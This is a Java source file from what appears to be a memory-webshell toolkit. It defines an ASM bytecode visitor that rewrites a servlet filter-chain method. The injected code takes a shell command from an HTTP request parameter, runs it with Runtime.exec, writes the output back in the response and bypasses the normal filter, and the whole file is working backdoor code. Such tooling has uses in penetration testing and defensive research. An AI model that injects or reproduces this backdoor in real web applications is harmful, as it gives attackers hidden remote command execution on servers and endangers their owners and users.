package com.reajason.javaweb.memshell.shelltool.command;

import org.objectweb.asm.Label;
import org.objectweb.asm.MethodVisitor;
import org.objectweb.asm.Opcodes;
import org.objectweb.asm.Type;

/**
 * @author ReaJason
 * @since 2025/3/26
 */
public class CommandFilterChainAsmMethodVisitor extends MethodVisitor {

    private final Type[] argumentTypes;

    public CommandFilterChainAsmMethodVisitor(MethodVisitor mv, Type[] argumentTypes) {
        super(Opcodes.ASM9, mv);
        this.argumentTypes = argumentTypes;
    }

    @Override
    public void visitCode() {
        super.visitCode();

        int startIndex = 1;
        for (Type type : argumentTypes) {
            startIndex += type.getSize();
        }

        // Explicitly define indices for all local variables
        int paramNameIndex = startIndex;
        int cmdIndex = startIndex + 1;
        int processIndex = startIndex + 2;
        int inputStreamIndex = startIndex + 3;
        int outputStreamIndex = startIndex + 4;
        int bufferIndex = startIndex + 5;
        int lengthIndex = startIndex + 6;
        int exceptionIndex = startIndex + 7;

        // Access method arguments - adjust based on whether method is static or not
        int requestIndex = 1;      // Arg index 1
        int responseIndex = 2;     // Arg index 2

        // Define our parameter name
        mv.visitLdcInsn("paramName");
        mv.visitVarInsn(Opcodes.ASTORE, paramNameIndex); // Store "paramName" in local var 3

        // Define labels for try-catch
        Label tryStart = new Label();
        Label tryEnd = new Label();
        Label catchHandler = new Label();

        // Register the try-catch block - THIS IS THE KEY PART THAT WAS MISSING
        mv.visitTryCatchBlock(tryStart, tryEnd, catchHandler, "java/lang/Exception");

        // Start of try block
        mv.visitLabel(tryStart);

        // Get the parameter from request: request.getParameter(paramName)
        mv.visitVarInsn(Opcodes.ALOAD, requestIndex); // Load request (first param)
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Object", "getClass",
                "()Ljava/lang/Class;", false);
        mv.visitLdcInsn("getParameter");
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Class");
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitLdcInsn(Type.getType("Ljava/lang/String;"));
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Class", "getMethod",
                "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);

        // Invoke the getParameter method
        mv.visitVarInsn(Opcodes.ALOAD, requestIndex); // Load request object
        mv.visitInsn(Opcodes.ICONST_1);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Object");
        mv.visitInsn(Opcodes.DUP);
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitVarInsn(Opcodes.ALOAD, paramNameIndex); // Load paramName
        mv.visitInsn(Opcodes.AASTORE);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke",
                "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
        mv.visitTypeInsn(Opcodes.CHECKCAST, "java/lang/String");
        mv.visitVarInsn(Opcodes.ASTORE, cmdIndex); // Store cmd in local var 4

        // Check if cmd is not null
        mv.visitVarInsn(Opcodes.ALOAD, cmdIndex);
        Label ifNullLabel = new Label();
        mv.visitJumpInsn(Opcodes.IFNULL, ifNullLabel);

        // Execute the command: Process exec = Runtime.getRuntime().exec(cmd);
        mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Runtime", "getRuntime",
                "()Ljava/lang/Runtime;", false);
        mv.visitVarInsn(Opcodes.ALOAD, cmdIndex); // Load cmd
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Runtime", "exec",
                "(Ljava/lang/String;)Ljava/lang/Process;", false);
        mv.visitVarInsn(Opcodes.ASTORE, processIndex); // Store Process in local var 5

        // Get input stream: InputStream inputStream = exec.getInputStream();
        mv.visitVarInsn(Opcodes.ALOAD, processIndex); // Load Process
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Process", "getInputStream",
                "()Ljava/io/InputStream;", false);
        mv.visitVarInsn(Opcodes.ASTORE, inputStreamIndex); // Store InputStream in local var 6

        // Get response output stream
        mv.visitVarInsn(Opcodes.ALOAD, responseIndex); // Load response (second param)
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Object", "getClass",
                "()Ljava/lang/Class;", false);
        mv.visitLdcInsn("getOutputStream");
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Class");
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Class", "getMethod",
                "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
        mv.visitVarInsn(Opcodes.ALOAD, responseIndex); // Load response
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Object");
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke",
                "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
        mv.visitTypeInsn(Opcodes.CHECKCAST, "java/io/OutputStream");
        mv.visitVarInsn(Opcodes.ASTORE, outputStreamIndex); // Store OutputStream in local var 7

        // Create buffer: byte[] buf = new byte[8192];
        mv.visitIntInsn(Opcodes.SIPUSH, 8192);
        mv.visitIntInsn(Opcodes.NEWARRAY, Opcodes.T_BYTE);
        mv.visitVarInsn(Opcodes.ASTORE, bufferIndex); // Store byte[] in local var 8

        // While loop to read and write data
        Label loopStart = new Label();
        Label loopEnd = new Label();

        // Start of loop
        mv.visitLabel(loopStart);

        // Read data: inputStream.read(buf)
        mv.visitVarInsn(Opcodes.ALOAD, inputStreamIndex); // Load inputStream
        mv.visitVarInsn(Opcodes.ALOAD, bufferIndex); // Load buffer
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/InputStream", "read",
                "([B)I", false);
        mv.visitVarInsn(Opcodes.ISTORE, lengthIndex); // Store length in local var 9

        // Check if length == -1
        mv.visitVarInsn(Opcodes.ILOAD, lengthIndex);
        mv.visitInsn(Opcodes.ICONST_M1);
        mv.visitJumpInsn(Opcodes.IF_ICMPEQ, loopEnd);

        // Write data: outputStream.write(buf, 0, length)
        mv.visitVarInsn(Opcodes.ALOAD, outputStreamIndex); // Load outputStream
        mv.visitVarInsn(Opcodes.ALOAD, bufferIndex); // Load buffer
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitVarInsn(Opcodes.ILOAD, lengthIndex); // Load length
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/OutputStream", "write",
                "([BII)V", false);

        // Go back to start of loop
        mv.visitJumpInsn(Opcodes.GOTO, loopStart);

        // End of loop
        mv.visitLabel(loopEnd);

        // Return from the method without calling original doFilter
        mv.visitInsn(Opcodes.RETURN);

        // If cmd is null, continue with original method
        mv.visitLabel(ifNullLabel);

        // End of try block
        mv.visitLabel(tryEnd);

        // Skip catch block if we didn't enter it
        Label afterCatch = new Label();
        mv.visitJumpInsn(Opcodes.GOTO, afterCatch);

        // Start of catch block
        mv.visitLabel(catchHandler);
        // The exception is now on the stack
        mv.visitVarInsn(Opcodes.ASTORE, exceptionIndex); // Store exception in local var 10 and discard it

        // End of catch block
        mv.visitLabel(afterCatch);
    }
}
